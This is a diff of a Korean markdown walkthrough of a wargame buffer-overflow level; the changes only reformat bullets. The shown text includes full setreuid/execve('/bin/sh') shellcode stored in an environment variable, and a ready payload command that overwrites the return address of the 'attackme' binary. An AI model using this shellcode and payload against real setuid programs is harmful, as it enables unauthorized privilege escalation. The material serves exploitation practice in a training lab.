@@ -64,12 +64,12 @@ gdb를 해석해 보면
 * main + 9 : SFP, RET =>8 byte  
 ===> 256(buffer) + 8(dummy) + 4(SFP) + 4(RET)  
 ![5](/images/십7.PNG)  
-export 명령어를 통해서 환경변수를 등록해준다  
-* export [환경변수명]=$(python -c 'print "쉘코드"')
+* export 명령어를 통해서 환경변수를 등록해준다  
+    - export [환경변수명]=$(python -c 'print "쉘코드"')
 * 쉘코드 : "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"  
 ![6](/images/십8.PNG)  
-env 명령어를 사용해 환경 변수를 확인한다  
-* env 명령어 : 현재 지정되어 있는 환경 변수들을 출력하거나, 새로운 환경 변수를 설정하고 적용된 내용을 출력하는 명령어  
+* env 명령어를 사용해 환경 변수를 확인한다  
+    - env 명령어 : 현재 지정되어 있는 환경 변수들을 출력하거나, 새로운 환경 변수를 설정하고 적용된 내용을 출력하는 명령어  
     - env [옵션]... [name = 값]... [명령[인수]...]  
 
 ![7](/images/십9.PNG)  
@@ -77,16 +77,16 @@ env 명령어를 사용해 환경 변수를 확인한다
 
 * getenv() 함수 : 환경변수를 읽는 역할  
 
-SHELLCODE를 실행시키는 프로그램을 짠 뒤 컴파일 해 준다  
+* SHELLCODE를 실행시키는 프로그램을 짠 뒤 컴파일 해 준다  
 dap을 실행해 보면 쉘코드 주소가 나타난다  
 
 ![9](/images/십11.PNG)  
 
-마지막으로 RET 주소까지 가기 위해서는 268 byte가 필요하므로 페이로드(전송되는 데이터)를 작성해야한다 
+* 마지막으로 RET 주소까지 가기 위해서는 268 byte가 필요하므로 페이로드(전송되는 데이터)를 작성해야한다 
 
-0xbffffc1d를 리틀엔디안으로 변환하면 \x1d\xfc\xff\xbf  
+* 0xbffffc1d를 리틀엔디안으로 변환하면 \x1d\xfc\xff\xbf  
 
-페이로드를 완성하면 ./attackme `python -c 'print "A"*268+"\x1d\xfc\xff\xbf"'`  
+* 페이로드를 완성하면 ./attackme `python -c 'print "A"*268+"\x1d\xfc\xff\xbf"'`  
 그 뒤에 id를 확인하고 level12가 된 것을 확인하고 my-pass를 통해 비밀번호를 확인한다  
 
 
